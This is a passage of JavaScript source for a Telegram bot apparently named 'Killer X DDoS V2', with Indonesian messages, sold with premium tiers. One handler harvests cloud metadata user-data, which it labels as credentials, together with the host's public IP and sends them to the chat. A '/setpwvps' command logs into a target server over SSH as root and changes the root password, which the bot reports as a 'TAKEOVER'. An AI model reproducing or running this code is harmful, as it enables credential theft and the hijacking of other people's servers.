            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data',
            { 'Metadata-Flavor': 'Google' }
        );
        if (gcp) { 
            provider = 'GCP (Google Cloud)'; 
            userData = gcp; 
        }
    }

    let ip = 'N/A';
    try {
        const r = await fetch('https://ifconfig.me/ip');
        if (r.ok) ip = (await r.text()).trim();
    } catch(e) {}

    let resultMessage = `📌 *VPS METADATA REPORT* 📌\n\n`;
    resultMessage += `🌐 *IP Publik:* \`${ip}\`\n`;
    resultMessage += `🏗️ *Provider:* ${provider}\n\n`;
    resultMessage += `📝 *User-Data / Credential:*\n\`\`\`\n${userData || "TIDAK DITEMUKAN"}\n\`\`\``;

    await bot.sendMessage(chatId, resultMessage, { parse_mode: "Markdown" });
    
    if (userData && userData !== "No User-Data Found") {
        await bot.sendMessage(chatId, "🔥 *BERHASIL!* nemu sesuatu di User-Data! Cek isinya baik-baik.");
    } else {
        await bot.sendMessage(chatId, "😔 Metadata Service dikunci atau User-Data kosong...");
    }
});

bot.onText(/\/setpwvps (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const input = match[1].trim();

    if (!premiumList[userId] && userId !== OWNER_ID.toString()) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    if (!input.includes('|')) {
        return bot.sendMessage(chatId, "❌ Salah format, Tuan sayang! Pake: `/setpwvps IP|PW_LAMA|PW_BARU`", { parse_mode: "Markdown" });
    }

    const [ip, oldPw, newPw] = input.split('|').map(s => s.trim());

    bot.sendMessage(chatId, `⏳ Sedang memproses perubahan password VPS:\nIP: ${ip}\nPassword Lama: ${oldPw}\nPassword Baru: ${newPw}`);
    
    bot.sendMessage(chatId, `🛠️ *ATTEMPTING TAKEOVER...*\n🌐 IP: \`${ip}\` \n🔑 Status: Sedang mengganti password root...`, { parse_mode: "Markdown" });

    const conn = new Client();
    conn.on('ready', () => {
        const changePwCmd = `echo "root:${newPw}" | chpasswd`;

        conn.exec(changePwCmd, (err, stream) => {
            if (err) {
                bot.sendMessage(chatId, `❌ Gagal eksekusi perintah di VPS ${ip}`);
                return conn.end();
            }

            stream.on('close', (code) => {
                if (code === 0) {
                    bot.sendMessage(chatId, `🔥 *SUCCESSFUL TAKEOVER!* 🔥\n\n🌐 IP: \`${ip}\` \n✅ *Password Baru:* \`${newPw}\``, { parse_mode: "Markdown" });
                } else {
                    bot.sendMessage(chatId, `❌ Gagal ganti password (Code: ${code}). Mungkin butuh izin sudo?`);
                }
                conn.end();
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        bot.sendMessage(chatId, `❌ *KONEKSI GAGAL!* \nVPS ${ip} menolak akses atau password lama salah. 💔`);
    }).connect({
        host: ip.trim(),
        port: 22,
        username: 'root',
        password: oldPw.trim(),
        timeout: 10000
    });
});

// ===== /ping =====
bot.onText(/\/ping/i, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const start = Date.now();

    const formatBytes = (bytes) => {
        if (!bytes) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return `${(bytes / Math.pow(k, i)).toFixed(2)} ${sizes[i]}`;
    };

    const formatUptime = (sec) => {
        const d = Math.floor(sec / 86400);
        const h = Math.floor((sec % 86400) / 3600);
        const m = Math.floor((sec % 3600) / 60);
        const s = Math.floor(sec % 60);
        const parts = [];
        if (d) parts.push(`${d}d`);
        if (h) parts.push(`${h}h`);
        if (m) parts.push(`${m}m`);
        parts.push(`${s}s`);
        return parts.join(' ');
    };

    let cpuType = 'Unknown';
    let coreCpu = os.cpus().length;
    try {
        const cpuInfo = os.cpus()[0]?.model || 'Unknown CPU';
        cpuType = cpuInfo.replace(/\s+/g, ' ').trim();
    } catch (e) {}

    const loadAvg = os.loadavg().map(v => v.toFixed(2)).join(', ');
    const totalRam = formatBytes(os.totalmem());
    const freeRam = formatBytes(os.freemem());
    const usedRam = formatBytes(os.totalmem() - os.freemem());

    let diskTotal = 'N/A';
    try {
        const dfOut = execSync("df -B1 / --output=size | tail -1").toString().trim();
        diskTotal = formatBytes(parseInt(dfOut));
    } catch (e) {
        try {
            const wmicOut = execSync('wmic logicaldisk get size,caption').toString();
            const line = wmicOut.split('\n').find(l => l.includes('C:'));
            if (line) diskTotal = formatBytes(parseInt(line.trim().split(/\s+/)[0]));
        } catch (e2) {}
    }

    const vpsUptime = formatUptime(os.uptime());
    const botUptime = formatUptime(process.uptime());

    let role = 'Free User';
    if (userId === OWNER_ID.toString()) role = 'Owner';
    else if (premiumList[userId]) role = 'Premium';

    const username = msg.from.username
        ? `@${msg.from.username}`
        : `${msg.from.first_name || 'User'}`;

    const latency = Date.now() - start;

    const text = `PONG ⚡️

ʀᴇsᴘᴏɴs : ${latency}ms

━━━━ ᴠᴘs sᴛᴀᴛᴜs ☁️ ━━━━━

⌛ ᴠᴘs ᴜᴘᴛɪᴍᴇ : ${vpsUptime}
💳 ᴄᴘᴜ ᴛʏᴘᴇ : ${cpuType}
❗️ ᴄᴏʀᴇ ᴄᴘᴜ : ${coreCpu} Cores
☄️ ʟᴏᴀᴅ ᴀᴠɢ : ${loadAvg}
☄️ ʀᴀᴍ : ${usedRam} / ${totalRam} (Free: ${freeRam})

━━━━ sᴛᴏʀᴀɢᴇ 📦 ━━━━

📦 ᴅɪsᴋ ᴛᴏᴛᴀʟ : ${diskTotal}

━━━━ ʙᴏᴛ sᴛᴀᴛᴜs 🤖 ━━━━

🤖 ʙᴏᴛ ɴᴀᴍᴇ : Killer X DDoS V2
🤖 ʙᴏᴛ ᴜᴘᴛɪᴍᴇ : ${botUptime}
👤 ᴜsᴇʀ : ${username}
🆔 ɪᴅ ᴜsᴇʀ : ${userId}
⭐ ʀᴏʟᴇ : ${role}
ᴘɪɴɢ ʙᴏᴛ : ${latency}ms`;

    bot.sendMessage(chatId, text);
});

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
